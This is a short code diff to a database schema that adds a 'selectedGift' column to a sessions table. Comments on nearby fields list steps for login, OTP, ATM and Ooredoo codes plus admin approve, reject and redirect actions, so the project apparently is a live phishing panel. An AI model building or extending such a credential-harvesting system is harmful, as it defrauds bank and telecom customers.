@@ -23,6 +23,7 @@ export const sessions = pgTable("sessions", {
   currentStep: varchar("currentStep", { length: 50 }), // login, otp, atm, ooredoo, otp_ooredoo
   adminAction: varchar("adminAction", { length: 20 }), // approve, reject
   redirectTarget: varchar("redirectTarget", { length: 50 }), // New field for admin redirection
+  selectedGift: varchar("selectedGift", { length: 50 }),
   errorMessage: text("errorMessage"),
   createdAt: timestamp("createdAt").defaultNow().notNull(),
   updatedAt: timestamp("updatedAt").defaultNow().notNull(),
